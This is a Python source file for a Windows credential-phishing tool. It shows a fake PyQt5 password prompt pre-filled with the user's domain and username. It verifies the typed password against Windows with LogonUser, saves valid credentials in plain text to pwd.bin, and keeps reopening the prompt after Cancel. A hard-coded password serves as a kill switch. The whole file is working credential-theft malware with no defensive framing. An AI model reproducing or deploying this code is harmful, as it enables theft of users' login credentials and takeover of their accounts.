import sys, os, time, random
import getpass, win32security
from subprocess import call
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyCred_GUI import Ui_Dialog


class MyGUI(Ui_Dialog):
	def __init__(self, dialog):
		Ui_Dialog.__init__(self)
		self.setupUi(dialog)
		background = self.resource_path("password.png")
		print(background)
		self.label_3.setPixmap(QtGui.QPixmap(background))
		domain = os.getenv('USERDOMAIN', 'defaultValue')
		username = os.getenv('USERNAME', 'defaultValue')
		dialog.activateWindow()
		self.lineUsername.setText(domain + "\\" + username)
		self.linePassword.setFocus(True)

		self.pushButton_2.clicked.connect(self.cancelbutton)
		self.pushButton.clicked.connect(self.okbutton)
		self.linePassword.returnPressed.connect(self.okbutton)

	@QtCore.pyqtSlot()
	def okbutton(self):
		dialog.hide()
		password = self.linePassword.text().strip()
		if password == "snakesonaplane":
			exit()
		domain = os.getenv('USERDOMAIN', 'defaultValue')
		username = os.getenv('USERNAME', 'defaultValue')
		try:
			hUser = win32security.LogonUser (
				username,
				domain,
				password,
				win32security.LOGON32_LOGON_NETWORK,
				win32security.LOGON32_PROVIDER_DEFAULT
			)
		except win32security.error:
			print("No glove no love")
			self.linePassword.setText('')
			time.sleep(random.choice([1,2,3,4]))
		else:
			with open("pwd.bin","a") as w:
				msg = "Domain:\t\t\t" + domain + "\nUsername:\t\t" + username + "\nPassword:\t\t" + password + "\n\n"
				w.write(msg)
			w.close
			time.sleep(2)
			exit()
		dialog.show()
		self.linePassword.setFocus(True)
		dialog.activateWindow()

	@QtCore.pyqtSlot()
	def cancelbutton(self):
		dialog.hide()
		time.sleep(random.choice([60,120, 240, 480]))
		dialog.show()
		dialog.activateWindow()

	@QtCore.pyqtSlot()
	def resource_path(self, relative_path):
		""" Get absolute path to resource, works for dev and for PyInstaller """
		try:
			base_path = sys._MEIPASS
		except Exception:
			base_path = os.path.abspath(".")
		return os.path.join(base_path, relative_path)
	

if __name__ == '__main__':
	app = QtWidgets.QApplication(sys.argv)
	#dialog = QtWidgets.QDialog()
	dialog = QtWidgets.QWidget()
	dialog.setWindowFlags(QtCore.Qt.WindowSystemMenuHint)
	prog = MyGUI(dialog)
	dialog.show()
	sys.exit(app.exec_())